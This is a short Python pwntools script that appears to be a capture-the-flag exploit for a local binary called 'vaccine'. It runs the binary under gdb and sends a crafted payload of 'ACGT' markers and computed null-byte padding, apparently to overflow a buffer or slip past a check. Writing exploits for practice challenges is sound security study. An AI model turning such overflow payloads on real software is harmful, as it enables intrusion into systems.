#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "neww"]
# io = process("./vaccine")
io = gdb.debug("./vaccine")

pad = 0x100 - 0x90
payload = b"ACGT" + b"\x00" * (pad - 4) + b"ACGT" + b"\x00"

io.sendlineafter(b"vaccine: ", payload)
print(io.recvall())
